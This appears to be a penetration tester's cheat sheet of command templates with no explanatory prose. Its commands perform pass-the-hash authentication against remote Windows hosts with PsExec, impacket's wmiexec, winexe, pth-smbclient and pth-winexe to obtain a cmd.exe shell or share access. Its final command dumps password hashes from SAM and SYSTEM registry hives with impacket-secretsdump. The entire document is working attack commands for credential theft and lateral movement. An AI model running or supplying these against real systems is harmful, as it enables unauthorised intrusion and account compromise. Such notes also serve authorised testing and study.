# pass the hash (psexec.exe)

```
.\PsExec.exe -accepteula -u <administrator/user> -p <lmhash>:<ntlmhash> cmd.exe
```

# pass the hash (wmiexec)

```
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes <lmhash>:<ntlmhash> <user>@<rhost> cmd.exe
```

# pass the hash (winexe)

```
winexe -U '<administrator/user>%<lmhash>:<ntlmhash>' //<rhost> cmd.exe
```

# pass the hash (smb; pth-smbclient)

```
pth-smbclient //<rhost>/<share(c$)> -U <PCNAME>/<user>%<lmhash>:<ntlmhash>
```

# pass the hash (pth-winexe)

```
pth-winexe -U <Administrator/user>%<lmhash>:<ntlmhash> //<rhost> cmd.exe
```

# get hashes from sam

```
impacket-secretsdump -sam sam -system system LOCAL
```
